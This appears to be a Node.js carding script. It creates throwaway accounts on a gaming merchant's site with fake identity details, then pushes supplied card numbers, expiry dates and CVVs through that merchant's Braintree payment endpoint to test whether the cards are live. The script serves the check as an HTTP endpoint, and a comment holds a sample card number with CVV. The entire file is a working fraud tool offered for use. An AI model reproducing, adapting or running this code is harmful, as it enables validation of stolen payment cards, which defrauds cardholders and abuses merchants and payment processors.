var request = require('request');
var fs = require('fs');

function checkCC(cc, cb) {
	if(cc.exp_month.length == 1)
		cc.exp_month = '0' + cc.exp_month;

	if(cc.exp_year.length == 4)
		cc.exp_year = cc.exp_year.substring(2);
	console.log('Checking: ' + cc.cc);

	var jar = request.jar();
	var random = new Date().getTime(); 
	request({
		url: 'https://secure.multiplay.co.uk/login',
		method: 'POST',
		jar: jar,
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded'
		},
		form: {
			'firstname': 'john',
			'surname': 'ddooee',
			'email':  random + '@mailinator.com',
			'password': 'accountszone',
			'dob-day': '01',
			'dob-month': '03',
			'dob-year': '1983',
			'country': 'United States',
			'gender': 'male',
			'tandc': 'agree',
			'submit': 'Create Account',
			'ref': '/cards',
			'm': 'new'
		},
		followAllRedirects: true
		//body: 'uid=johnapple@mailinator.com&pwd=143310&ref=&m=proc'
	}, function(err, res, body) {
		var idx = body.indexOf('problem');

		request({
			url: 'https://www.braintreegateway.com/merchants/39m8frm9fq5gxfzz/transparent_redirect_requests',
			method: 'POST',
			jar: jar,
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded'
			},
			followAllRedirects: true,
			body: 'tr_data=55be2597ed66be8537776e3246c677ac71d10cda%7Capi_version%3D2%26credit_card%255Bcustomer_id%255D%3D1076247%26credit_card%255Boptions%255D%255Bverify_card%255D%3D1%26kind%3Dcreate_payment_method%26public_key%3D6tssjm97w6vsjphr%26redirect_url%3Dhttps%253A%252F%252Fsecure.multiplay.co.uk%252Fbraintree.php%253Fm%253Dconfirm%26time%3D20140730223032&credit_card__cardholder_name=John+Apples&credit_card__number=' + cc.cc + '&credit_card__expiration_month=' + cc.exp_month + '&credit_card__expiration_year=' + cc.exp_year + '&credit_card__cvv=' + cc.cvc  + '&credit_card__billing_address__first_name=John&credit_card__billing_address__last_name=Apples&credit_card__billing_address__extended_address=&credit_card__billing_address__street_address=&credit_card__billing_address__locality=&credit_card__billing_address__region=&credit_card__billing_address__postal_code=&credit_card__billing_address__country_name=Afghanistan&m=Add+Card'
		}, function(err, res, body) {
			cb(body.indexOf('Gateway Rejected') === -1 && body.indexOf('Unknown Error') === -1);
		});
	});
}

var express = require('express');
var app = express();

app.get('/ccc', function(req, res){
	checkCC(req.query, function(result) {
		res.send({works: result});
	});
	/*
			cc: '4512238764776232',
		exp_month: '08',
		exp_year: '17',
		cvc: '534'
		*/
});

app.listen(3000);